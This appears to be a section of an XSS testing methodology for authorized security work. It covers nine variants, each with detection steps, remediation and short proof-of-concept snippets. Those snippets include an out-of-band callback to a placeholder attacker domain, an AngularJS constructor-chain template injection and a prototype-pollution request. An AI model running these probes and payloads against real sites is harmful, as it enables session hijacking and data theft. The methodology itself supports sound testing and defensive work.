# Variants 1-9 — xss-testing

Classic taxonomy folded in: V-02 = reflected, V-03 = DOM-based, V-04 = stored, V-05 = blind.
V-01 is the transport matrix that applies to all four. Payload templates and probe sets live
in `payloads.md`.

## Table of contents

- [V-01: Multi-transport parameter reflection (POST/GET XSS matrix)](#v-01-multi-transport-parameter-reflection-postget-xss-matrix)
- [V-02: Immediate context reflection boundary evasion (RXSS)](#v-02-immediate-context-reflection-boundary-evasion-rxss)
- [V-03: Client-side sink exploitation (DOM-based XSS source analysis)](#v-03-client-side-sink-exploitation-dom-based-xss-source-analysis)
- [V-04: Persistent storage script injection (stored XSS architecture)](#v-04-persistent-storage-script-injection-stored-xss-architecture)
- [V-05: Out-of-band testing (blind XSS tracking engines)](#v-05-out-of-band-testing-blind-xss-tracking-engines)
- [V-06: Browser SOP defiance (universal XSS / UXSS)](#v-06-browser-sop-defiance-universal-xss-uxss)
- [V-07: Parsing misalignment (mutation XSS / mXSS vs DOMPurify)](#v-07-parsing-misalignment-mutation-xss-dompurify-mxss)
- [V-08: Framework expression sandbox evasion (CSTI — AngularJS / Vue)](#v-08-framework-expression-sandbox-evasion-csti--angularjs--vue)
- [V-09: DOM XSS-assisted prototype pollution exploitation](#v-09-dom-xss-assisted-prototype-pollution-exploitation)

---

## V-01: Multi-transport parameter reflection (POST/GET XSS matrix)

**Mechanism:** The app reflects request data regardless of transport — query string, form body, JSON, multipart field, or logged header — into an HTML response. The violated assumption is "input comes from the URL bar": frameworks copy query params into POST handlers, merge request super-globals, and reflect `User-Agent`/`Referer` on error pages. Attackers who only fuzz GET never reach the sink.

**Preconditions:**
- At least one endpoint reflects request data into HTML (any transport).
- Parameter discovery covers POST/JSON/multipart, not just query strings.
- No CSP, or `script-src` with inline/`unsafe-eval` (bypassable).

**Detect:**
1. Fuzz the parameter list as GET, then re-run the same list as `POST` form bodies; diff which transports reflect.
2. Replay one logical request three ways: `?q=<zz1>`, `q=<zz1>` form body, JSON `{"q":"<zz1>"}` — record which echo.
3. Send `<zz1>` in `User-Agent`, `Referer`, `X-Forwarded-For`, then trigger an error/admin-log view — header XSS hides there.
4. For each reflecting transport, note the render context separately (transport matrix ≠ context matrix).

**Proof of concept:**
```bash
curl -s -X POST 'https://<TARGET>/search' -H 'User-Agent: <MARKER>' --data 'q=<MARKER>' \
  | grep -o '.\{40\}<MARKER>.\{40\}'     # repeat with ?q=<MARKER> on the same path
```

**Confirm:** the executing payload fires from a transport you believed unexploitable, in a real browser, and raw responses from the other transports show the same byte sequence (one render path, multiple feeds).

**False positives:** WAF/framework error pages echoing your probe on *every* request (check status + body template); header reflections visible only to your own session (self-XSS — downgrade); parameters your tooling duplicated across transports, making it look like one request hit two sinks. Also: **reflection count ≠ reflection risk on SSR frameworks** — Next.js App Router will reflect one query param up to 4+ places at once (body `href`, inline RSC JSON, `next-router-state-tree`, `<link rel=canonical>` + every `hreflang` mirror), which looks spectacular in a grep and is still safe if each occurrence is percent-encoded. Check the *encoding state per occurrence*, not the hit count — a 2026-10 session showed 73 reflections of one param across 25 hreflang tags with zero unencoded bytes.

**Impact:** report per reflecting transport — a POST-only reflected XSS is still attacker-deliverable via an auto-submitting form on any origin, so severity equals GET-based; mention transport breadth because scanners and WAF rules usually watch only one.

**Remediation:** route every transport through one output-encoding chokepoint at the render layer; logged headers and request bodies are display data, not trusted input.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## V-02: Immediate context reflection boundary evasion (RXSS)

**Mechanism:** Reflected XSS breaks out of the exact syntactic context where the server drops your bytes: tag text, attribute value, JS string, event handler, or URL. Evasion = choosing the breakout that matches the *real* context instead of the assumed one. The violated assumption: "the template framework encodes it" — it encodes for one context; reflection into a different (or bypassed) context loses that guarantee.

**Preconditions:**
- Parameter reflects in the same response.
- Reflection survives into rendered output, not only a JSON/JS-escaped string.
- Response parsed as HTML (`text/html`, or sniffable — see V-17).

**Detect:**
1. Run the context ladder from `payloads.md` §3: `<zz1>` → `"><zz2>` → `'><zz3>` → `</tag><zz4>`, reading raw bytes after each to pinpoint the boundary.
2. Determine attribute quoting (double / single / unquoted) and whether a framework re-encodes `<`, `>`, `&`, quotes on the way out.
3. Check where the reflection sits — `<title>`, `<textarea>`, `<style>`, `<script>`, comments each need their closing delimiter first.

**Context sub-notes (pick the breakout that matches):**
- **HTML text:** `<zz1>` suffices; close the surrounding `<title>`/`<textarea>`/`<style>`/comment first.
- **Attribute:** `"><zz1>` (double), `'><zz1>` (single), `" autofocus onfocus=zz1` (unquoted — no `>` needed).
- **JavaScript:** escape the string quote first: `';zz1;//` or `";zz1;//`; backticks in template literals; numeric slots take `1,zz1`.
- **Event-handler:** already JS but gated by HTML — `"><img src=x onerror=zz1>` or break the handler string with `zz1//`.
- **URL/URI:** `javascript:zz1` in `href` (click needed) vs `iframe src` (no click); `data:text/html,...` where allowed.
- **VBScript (legacy IE only):** `onmouseover="vbscript:..."` — a footnote unless scope pins old IE; note it and move on.
- **HTML entity / Unicode:** entities reflecting raw (`&#97;`) mean decode-order — that is V-12; here just establish whether decode happens before or after escaping.

**Proof of concept:**
```bash
curl -s 'https://<TARGET>/search?q=%22%3E%3Czz2%3E' | grep -c '<zz2>'   # attribute breakout
# full proof payloads per context: payloads.md §2 — swap in the marker the ladder selected
```

**Confirm:** two signals — raw response shows breakout bytes unencoded at the identified position, AND a real browser renders the injected node and fires the inert proof.

**False positives:** reflection inside a JSON/JS string where `<` is `\u003c` (grep-inert, browser-inert); quotes backslash-escaped by `JSON.stringify` so the string never closes; reflection inside a `<template>` the parser doesn't render; your own marker cached from an earlier test. **A pasted report's claimed context is a historical observation, not ground truth** — a report saying "unquoted attribute" may now render quoted *and* entity-encoded because a patch landed after submission (2026-10-24: frontier.com `asn` payload `x autofocus onfocus=…` fully inert; `value="…"` with `<`→`&lt;` `"`→`&quot;` — same result from curl, content-negotiation variants, multipart, valid-data flow, and a real browser). **Run the baseline+marker retest of the REPORTED endpoint first, before crawling for "the same bug elsewhere"** — if the original no longer reproduces, the whole same-class hunt on that host may rest on a stale premise, and the report you were extending is (patched | false positive); get the original raw bytes to tell which.

**Impact:** "attacker-crafted URL runs arbitrary JS in victims' sessions on <origin>" — self-service reflected bug with no privileged audience is Medium unless it exposes auth-gated functionality (password change, token display), then higher.

**Remediation:** context-aware auto-escaping at the template layer — HTML body, attribute, JS, and URL encoding are four different functions, not one.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## V-03: Client-side sink exploitation (DOM-based XSS source analysis)

**Mechanism:** Attacker data flows entirely in the browser — a *source* (`location.hash`, `document.URL`, `window.name`, `postMessage`, `localStorage`) is read into a *sink* (`innerHTML`, `document.write`, `eval`, string-`setTimeout`, `.src`/`.href`) with no server round-trip. The violated assumption: "the server never saw my payload" — the bug lives in the JavaScript, not the response.

**Preconditions:**
- A reachable source flows (possibly via helpers) into a dangerous sink.
- No sanitizer between them, or one weaker than the sink (see V-07).
- The vulnerable JS ships to victims (frontend bundle / loaded CDN script).

**Detect:**
1. Grep bundles/source maps for sources: `location.hash|location.search|document.URL|document.referrer|window.name|postMessage|localStorage|URLSearchParams`.
2. Grep for sinks: `innerHTML|outerHTML|insertAdjacentHTML|document.write|eval(|new Function|setTimeout(` with string first arg, `.src =`, `.href =`, jQuery `$(...)/.html(`.
3. Dynamic: hook `Element.prototype.innerHTML` (or break on the sink) in DevTools, visit with `#<zz1>` / `?<p>=<zz1>`, watch your bytes arrive.
4. Trace intermediate helpers (`decodeURIComponent`, custom `escapeHtml`, `DOMPurify.sanitize`) — a helper decides exploitability vs. false lead.

**SPA bundle-graph funnel (for Vite/module-federation apps, no source maps):** (1) reconstruct chunks from the lazy-import map in the main bundle (`import("./Chunk-<hash>.js")`) plus the route-constants table (`e.routeName="/path"`); (2) download every chunk; (3) intersect source chunks with sink chunks; (4) hand-trace each intersection's dataflow; (5) confirm ambiguous ones in a real browser; (6) dynamic sink-hook sweep across reachable routes as a backstop. Static dataflow predicted every dynamic result — trust it, and spend browser time only on the ambiguous links.

**Two high-value false-positive patterns (verify before reporting):**
- **Router-bound sinks:** a URL param flowing into `<Link to={param}>`, `history.push(param)`, or an apparent `location.replace(param)` that is actually a route-builder hardcoding a leading `/`. react-router v5 `createHref` normalizes a raw `javascript:`/`https://evil` value by prepending `/`, turning it into an inert same-origin path. Only a protocol-relative `//host` survives, and only as an open-redirect gated on a modifier click (ctrl+click / open-in-new-tab). Settle the question offline with a local `react-router-dom@<version>` harness before claiming a finding.
- **postMessage → innerHTML:** if the handler gates on `e.origin === <fixed constant>`, it is not attacker-reachable unless that exact host is separately compromised — that is a chain, not a standalone bug.

**Hook gotcha (dynamic sweeps):** an init script that overrides the `Function` constructor (or `eval`/`setTimeout`) can crash module-init (e.g. Vite) so the app never boots — the result is a false "0 hits." Always run a positive control (a known-working sink) on every sweep; if the control does not fire, fix the instrumentation before trusting any zeros.

**Pre-check gotcha (cheaper than any hook — run it before the sweep):** confirm the app's JS *actually loads at all*. In importmap apps the HTML carries `<script type="importmap">{"imports":{"application":"/assets/application-<digest>.js"}}</script>` + `<script type="module">import "application"</script>` + `<link rel="modulepreload" href="/assets/application-<digest>.js">`; **fetch that target and check the status code** (202-10-25, sandbox.reready.co: the preloaded/imported bundle returned 404 while the unhashed `/assets/application.js` returned 200 — the whole jQuery/Bootstrap/rails-ujs bundle never executed, so every DOM sink in it was dead code). If the entry module 404s (deploy mismatch: HTML digest ≠ file on disk) or a bundler chunk fails to load, a "0 fires" sweep means nothing about vulnerability — the same class of false-clean as the hook crash above, but detectable offline with one HEAD. Also grep the page for `<script src=` before assuming the bundle you downloaded is the one the browser runs.

**Proof of concept:**
```text
https://<TARGET>/app/#<payload-from-payloads.md-§2.1/§2.2>
https://<TARGET>/app?next=<payload>            # window.name variant: pre-set via attacker page
```

**Confirm:** debugger/wrapper shows attacker bytes reaching the sink AND the rendered DOM contains the injected node firing the proof — dynamic taint observation plus post-execution DOM state.

**False positives:** sanitization hiding in the helper chain (most grep hits are decode-then-escape); sinks fed from server state (`window.__DATA__`) an attacker can't set; `window.name`/`localStorage` vectors requiring attacker script already on the origin (self-XSS unless you prove delivery); `JSON.parse` — a source, not a sink.

**Impact:** DOM XSS is reflected-equivalent but lives client-side — patching needs a frontend release (slower, version-gated), which strengthens "time to fix" arguments in the report.

**Remediation:** replace the sink with a safe one (`textContent`, allowlisted `setAttribute`) or sanitize at the sink with an HTML parser after all decoding.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## V-04: Persistent storage script injection (stored XSS architecture)

**Mechanism:** Attacker input persists server-side (DB row, log, file, cache) and renders unencoded to whoever later views it. The violated assumption: "input was validated on write" — write-time validation checks the *write* parser's context, while rendering runs through a different, richer parser.

**Preconditions:**
- A writable field: profile, comment, ticket, filename, product name, CMS body.
- It renders in HTML to at least one other viewer role.
- Write-time filtering incomplete, or differently encoded than at render.

**Detect:**
1. Inventory every writable field reachable in your test account — including "benign" ones juniors skip: display name, avatar alt text, filename, webhook description, triggerable error text.
2. Plant a unique marker (`zz7f3`) in each; re-login, re-fetch via API, diff which responses carry it verbatim vs. encoded vs. absent.
3. For verbatim fields, run V-02's ladder against the *rendering* endpoint, not the saving one.
4. If a second test account is allowed, fetch the render page as that account to learn who actually sees it.

**Proof of concept:**
```http
POST /api/profile HTTP/1.1        → {"displayName":"<PAYLOAD-TEMPLATE>"}
GET  /profile/<ACCOUNT_ID>        ← response must contain payload bytes verbatim
```

**Confirm:** a *different session or account* (fresh browser profile, no cache, no attacker state) gets the executing payload; persistence survives logout/login.

**False positives:** self-view-only fields (self-XSS unless admins also view them); raw bytes in the API but sanitized HTML in the render (test the render!); email-only rendering (not XSS); claiming cross-user impact from a single session.

**Impact:** phrase as who-sees-it: "any user viewing the victim's profile executes attacker JS" or "an admin reviewing the report executes attacker JS" — audience drives severity (stored + admin = High/Critical).

**Remediation:** encode contextually at *render* time for every consumer of the stored field, and allowlist-sanitize rich fields on both write and render.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## V-05: Out-of-band testing (blind XSS tracking engines)

**Mechanism:** The payload executes where you never see the render — admin panel, log viewer, CRM preview, screenshot/monitoring bot, email-security crawler — and you learn via a callback to infrastructure you control. The violated assumption: "internal viewers are trusted operators"; their rendered content is yours.

**Preconditions:**
- An attacker-controlled string is stored or logged for later internal viewing.
- The internal render path executes scripts (no strict internal CSP) or fetches URLs.
- You control an OOB collector (Burp Collaborator, interactsh, logged VPS).

**Detect:**
1. Target fields plausibly seen internally: support tickets, abuse reports, payment memos, usernames, logged headers, filenames, webhook payloads.
2. Plant *script-requiring* payloads, not plain `<img src>` — a bare image hit proves fetch, not execution. Give each field a unique `i=<UNIQ>` in the callback URL so hits are attributable to field + payload family.
3. Plant 3-5 variants per field (classic `<script src>`, `onerror`, SVG `onload`, filtered-evasion form — `payloads.md` §3/§4).
4. Watch the collector; classify each hit by which marker fired (execute-marker vs. fetch-marker).

**Proof of concept:**
```http
POST /api/ticket            → {"subject":"<PAYLOAD-WITH-//<OOB_DOMAIN>/b?i=<UNIQ>>","body":"..."}
GET  /b?i=<UNIQ>            ← callback should carry internal page URL + browser UA
```

**Confirm:** callback arrives from a browser-like UA *with the internal page URL* (or your DOM marker appears in a screenshot-bot's output). A bare TCP hit from the target's crawler IP may be a URL-preview fetch — not JS execution.

**False positives:** link-preview/scanner bots that fetch without executing (why you use distinct markers per payload type); your own earlier tests firing from your own session (unique IDs + retention-window retests); DNS-only callbacks proving nothing about HTML context.

**Impact:** highest-severity XSS when the audience is privileged: "stored payload executes in an administrator's browser, granting the attacker the admin's session capabilities" — state explicitly what you did NOT do (proof marker only) and what a real attacker could do.

**Remediation:** render-time encoding applies to internal views too — admin panels are the *most* dangerous render path — plus strict CSP on internal tools and `default-src 'none'`-style policies on HTML email.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## V-06: Browser SOP defiance (universal XSS / UXSS)

**Mechanism:** A browser-engine bug lets attacker script run holding the origin of a *different* site — via flawed `document.domain` handling, URL-parser disagreement, `about:blank`/`srcdoc` origin inheritance, or renderer bugs in DOM APIs. The violated guarantee is the browser's isolation model itself, not any application's input handling.

**Preconditions:**
- A specific vulnerable browser build (pin and name the version).
- Reproducible in a clean profile, extensions disabled.
- **Scope reality:** this is a browser-vendor finding — web-app programs won't pay it; report to the browser program, at most note it as context in the app report.

**Detect:**
1. Exhaust app-side explanations first: iframe without `sandbox` (expected), CORS headers (server bug), explicit `document.domain` relaxation (app misconfig), unvalidated postMessage (app bug).
2. Test only with two domains you own (origin A embedding/observing origin B) — never against third-party sites.
3. Probe known-buggy edges on your lab pair: `srcdoc` iframe origin inheritance, `about:blank` navigation after `document.write`, `document.domain` setter, SVG/`use` cross-origin reads.
4. Check the latest canary — many UXSS bugs die in nightly long before stable.

**Proof of concept:** (own domains only)
```html
<iframe id="f" src="https://<ORIGIN_B>/index.html"></iframe>
<script>f.onload=()=>{document.title='UXSS:'+tryReadCrossOrigin();}</script>
```

**Confirm:** cross-origin DOM access succeeds on a pinned vulnerable build AND fails on the next build (or with the suspected API disabled) — the differential proves it's the engine, not the app.

**False positives:** sandboxed iframes missing `allow-same-origin` (sandbox working as designed); CORS reflecting your `Origin` (server-side finding); `postMessage` accepting `'*'` (app bug); legitimate same-site subdomains sharing origin.

**Impact:** browser program: "full SOP bypass enables session hijacking of any site the victim visits" — Critical. App report: context only; never claim app impact from a browser bug.

**Remediation:** vendor patch (browser program); app-side defense-in-depth only if an app vector contributed: `frame-ancestors`, `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`.

**CWE / OWASP:** CWE-346 (Origin Validation Error) / OWASP A05:2021 Security Misconfiguration.

---

## V-07: Parsing misalignment (mutation XSS / mXSS vs DOMPurify)

**Mechanism:** The sanitizer parses HTML one way, serializes it, and the browser's `innerHTML` parser re-parses differently — namespace switching (SVG/MathML in HTML), `<noscript>`/`<form>`/`<table>` nesting correction, browser-specific serialization quirks mutate inert markup into executable markup *after* sanitization. The violated assumption: "sanitized = safe", where sanitization is a lossy translation between two parsers that don't agree.

**Preconditions:**
- Sanitizer pass (DOMPurify, purifiers) followed by an `innerHTML`-style re-parse.
- A known differential: namespace confusion, `<template>`/`<noscript>` nesting, or a version with published bypasses (check the shipped version!).
- Attacker input reaches the sanitizer (stored field, `v-html`, `dangerouslySetInnerHTML`, rich text).

**Detect:**
1. Read `DOMPurify.version` (or package lock) and check its advisory history for mutation bypasses.
2. Check pipeline order: sanitize → serialize → `innerHTML` → serialize again? Classic mutation needs *two* round-trips.
3. Feed namespace-switching probes (`payloads.md` §2.9), capture output, then double round-trip in console: `el.innerHTML = el.innerHTML;` — mutation often appears only on the second pass.
4. Inspect the live DOM (never the string) for `<img onerror>`/`<svg onload>` nodes the string output didn't visibly contain.

**Proof of concept:**
```text
POST <MUTATION-PAYLOAD> → GET render page → paste output into console:
var d=document.createElement('div'); d.innerHTML=OUT; d.innerHTML=d.innerHTML; console.log(d.innerHTML);
# Mutation = executable node present after round-trip, absent before.
```

**Confirm:** the injected handler executes in the real render path (clean fetch, browser console marker), and the differential holds: pre-sanitizer string inert, post-round-trip string active.

**False positives:** payload that executes only when pasted straight into a console (you bypassed the app); mutation requiring a browser the audience doesn't run (IE-only backtick serialization — check real user agents); output shown in a `<pre>` (string never re-parsed = inert — verify the sink assigns `innerHTML`).

**Impact:** sanitizer bypass = High/Critical wherever the field is visible, because teams treat sanitizer presence as the whole defense — name the exact version and the triggering round-trip.

**Remediation:** upgrade the sanitizer, serialize once (sanitize the final DOM, not intermediate strings), and use a strict tag/attribute allowlist that excludes namespace-switching elements.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection (also CWE-183 Permissive Allowlist).

---

## V-08: Framework expression sandbox evasion (CSTI — AngularJS / Vue / Svelte)

**Mechanism:** Client-side frameworks compile templates and *evaluate expressions* in the page's JS context. If attacker input lands inside a template that later compiles (`{{...}}`, directives, interpolation), your string becomes code — in AngularJS, through a sandboxed expression evaluator with a long history of escapes. The violated assumption: "templates are developer-authored"; any string interpolated before compile is code.

**Preconditions:**
- Detectable framework: `ng-app`, angular/vue/svelte in bundle, visible double `{{ }}`.
- Input interpolated into the template *before/as* it compiles (server-injected values, `v-html`/`ng-bind-html` areas).
- AngularJS: a version with a published sandbox bypass (most ≤1.8.x).

**Detect:**
1. Fingerprint: view-source for `angular.js`/`vue.runtime` + version; `ng-app`; `__VUE__` hooks; `${{ }}` double-parsing artifacts.
2. Send inert arithmetic: `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`. `49` in the **live DOM** = client-side evaluation; `49` only in raw HTML = server-side engine → that's SSTI, go to `rce-testing`.
3. If `49` renders client-side, escalate to a marker payload (`payloads.md` §2.7): AngularJS constructor-chain or Vue instance gadget.
4. Confirm the compile path: breakpoint on `$compile`/`Vue.$mount`, or verify your string reached template source before rendering.

**Proof of concept:**
```http
GET /page?name={{7*7}}                                 ← detection: renders 49?
GET /page?name={{constructor.constructor('<PROOF>()')()}}   ← AngularJS family (version-adjust)
```

**Confirm:** `49` renders in the live DOM (raw echo is not evaluation) AND a constructor-chain proof fires with the inert marker — two signals proving compile-time evaluation.

**False positives:** server-side engines echoing the syntax (raw-vs-DOM check; SSTI is a different skill/severity); Vue 3 has no template sandbox — failing `${{ }}` doesn't rule Vue out, test `v-html` paths; CSP without `unsafe-eval` kills AngularJS gadgets — report the CSP as mitigation, don't overclaim RCE.

**Impact:** template injection grants arbitrary JS in victim sessions and signals an EOL/weak frontend posture (classic: pinned AngularJS 1.x) — High on an auth-sensitive origin.

**Remediation:** never interpolate untrusted input before compile — use framework property binding with default escaping; move off EOL AngularJS and drop `unsafe-eval` from CSP.

**CWE / OWASP:** CWE-94 (Code Injection) / CWE-79 / OWASP A03:2021 Injection.

---

## V-09: DOM XSS-assisted prototype pollution exploitation

**Mechanism:** Attacker JSON pollutes `Object.prototype` (via `$.extend`/`lodash.merge`/recursive copy honoring `__proto__` or `constructor.prototype`), and a *gadget* elsewhere reads the polluted property into a dangerous sink — `script.src` from a polluted option, sanitizer config disabled by pollution, callback/`transform` functions. The violated assumption: "objects have the shape the code wrote" — every `{}` inherits attacker keys.

**Preconditions:**
- Client-side merge sink reachable with attacker JSON (query, postMessage, localStorage, stored JSON read on load).
- A gadget in a loaded library (jQuery <3.4.0 `$.extend`, vulnerable lodash merge, AngularJS config gadgets, sanitizer-option pollution).
- No `Object.freeze(Object.prototype)` in the bundle — check!

**Detect:**
1. Grep for merge sinks: `$.extend(true`, `_.merge`, nested `Object.assign`, recursive `merge(`/`deepCopy(` fed from `location`/`postMessage`.
2. Probe harmlessly: inject `{"__proto__":{"zzprobe":"1"}}` at the sink, then in console check `({}).zzprobe` — `"1"` proves the write. Also try `{"constructor":{"prototype":{"zzprobe":"1"}}}` (bypasses naive `__proto__` filters).
3. Hunt gadgets: loaded libs reading option properties into sinks (`script.src`, library `innerHTML` renders, `sanitize` config keys, `parseHTML` flags).
4. Turn the gadget into execution using `payloads.md` — the pollution step and trigger step are two separate requests/actions.

**Proof of concept:**
```http
POST /api/prefs       {"settings":"{\"__proto__\":{\"<GADGET_KEY>\":\"<PAYLOAD>\"}}"}
GET  /app             ← merge runs, gadget reads polluted key, fires
```

**Confirm:** `({}).<pollutedKey>` evaluates to your value in the victim page context, AND the proof fires on a *separate* page/request from the injection — that separation distinguishes pollution from direct DOM injection.

**False positives:** your JSON reflected straight into `innerHTML` (no pollution — the `zzprobe` check runs first, always); server-side Node pollution (different chain → `info-disclosure-testing`/`rce-testing`; verify in the *browser* console, not response diffs); pollution with no gadget = integrity/DoS issue, not XSS; libraries already stripping `__proto__` (lodash ≥4.17.11 safe-merge) — confirm versions.

**Impact:** "pollution reaches a gadget executing attacker JS" — High; also note pollution may alter security-relevant flags elsewhere (sanitizer toggles), potentially compounding into a second finding.

**Remediation:** `Object.create(null)` config maps or frozen prototypes, strip `__proto__`/`constructor` at the merge boundary, and fix the gadget sink — one layer alone stays exploitable.

**CWE / OWASP:** CWE-1321 (Prototype Attributes) chained with CWE-79 / OWASP A03:2021 Injection.
